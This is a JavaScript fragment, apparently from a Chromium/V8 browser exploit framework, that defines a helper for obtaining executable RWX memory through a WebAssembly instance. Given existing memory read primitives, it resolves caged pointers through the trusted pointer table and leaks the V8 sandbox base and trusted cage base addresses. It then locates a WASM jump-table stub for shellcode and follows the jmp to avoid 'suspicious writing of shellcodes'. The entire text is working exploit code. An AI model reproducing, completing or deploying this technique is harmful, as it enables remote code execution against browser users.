// Retrieve RWX callable memory pages from WASM modules
// For >= M122, resolve caged pointers using TRUSTED_PTR_TABLE, and retrieve SANDBOX_BASE & TRUSTED_CAGE_BASE
{
    var getWasmRWX = (sig_in, sig_out, body) => {
        assert(
            (FINGERPRINT.browser.chromium_version.major ?? 122) < 122 || FINGERPRINT.platform.arch === "x86"
            || typeof TRUSTED_PTR_TABLE !== "undefined",
            "[-] TRUSTED_PTR_TABLE is not set"
        );

        let builder = new WasmModuleBuilder();
        let sig = makeSig(sig_in, sig_out);
        builder.addFunction("main", sig).addBody(body).exportFunc();

        let instance = builder.instantiate();
        let instance_struct = new STRUCTS.WasmInstanceObject(addrOf(instance));
        let jump_table_start = typeof instance_struct.jump_table_start !== "undefined" ?
            (FINGERPRINT.platform.bitness === "32" ?
                BigInt(sbxMemory.getUint32(instance_struct.jump_table_start, true))
                : sbxMemory.getBigUint64(instance_struct.jump_table_start, true))
            : undefined;

        // On 32-bit, the V8 sandbox is disabled
        if (typeof jump_table_start === "undefined" && FINGERPRINT.platform.bitness === "32") {
            let trusted_data = new STRUCTS.WasmTrustedInstanceData(sbxMemory.getUint32(instance_struct.trusted_data, true));
            jump_table_start = BigInt(sbxMemory.getUint32(trusted_data.jump_table_start, true));
        }

        // After M122 (jump_table_start is in Trusted Space)
        else if (typeof jump_table_start === "undefined") {
            let trusted_data_handle = BigInt(sbxMemory.getUint32(instance_struct.trusted_data, true));
            let trusted_data_uncaged = uncage(trusted_data_handle, TRUSTED_PTR_TABLE);
            if ([122, 123].includes(FINGERPRINT.browser.chromium_version.major)) trusted_data_uncaged = tagPtr(trusted_data_uncaged);   // on M122-M123, pointers in the trusted pointer table are not tagged (prevent assertion error in STRUCTS.WasmTrustedInstanceData)

            let trusted_data = new STRUCTS.WasmTrustedInstanceData(trusted_data_uncaged);
            jump_table_start = getBigUint(trusted_data.jump_table_start);

            // Leak the trusted cage base address using the uncaged WASM Trusted Instance Data
            if (typeof TRUSTED_CAGE_BASE === "undefined") {
                TRUSTED_CAGE_BASE = trusted_data.base & ~0xffffffffn;
                log("[+] Leaked TRUSTED_CAGE_BASE=0x" + hex(TRUSTED_CAGE_BASE), 2);
                assert(TRUSTED_CAGE_BASE > 0x0n, "[-] Invalid TRUSTED_CAGE_BASE pointer");
            }

            // Leak the sandbox base address using memory0_start=empty_backing_store (which points to the end of the sandbox)
            if (typeof SANDBOX_BASE === "undefined") {
                let empty_backing_store = getBigUint(trusted_data.memory0_start);
                SANDBOX_BASE = ((empty_backing_store+1n) & 0xffffffff00000000n) - 0x10000000000n;
                log("[+] Leaked SANDBOX_BASE=0x" + hex(SANDBOX_BASE), 2);
                assert((SANDBOX_BASE > 0x0n) && (SANDBOX_BASE & 0xffffffffn) === 0x0n, "[-] Invalid SANDBOX_BASE pointer");
            }
        }

        assert(jump_table_start > 0n && !(jump_table_start % 0x1000n), "[-] Invalid jump_table_start pointer: 0x" + hex(jump_table_start));

        // Try to follow the jmp instruction to avoid suspicious writing of shellcodes on jump_table_start
        let rwx_addr = jump_table_start;
        if (FINGERPRINT.platform.arch === "x64") {
            let jmp = getBigUint(jump_table_start, 4);
            assert((jmp & 0xffn) === 0xe9n, "[-] Invalid jump_table_start instruction at 0x" + hex(jump_table_start));
            rwx_addr = jump_table_start + (jmp >> 8n) + 5n;
        }

        log(`[+] Retrieved a WASM RWX stub at 0x${hex(rwx_addr)}`, 5);
        return [rwx_addr, instance.exports.main];
    }
}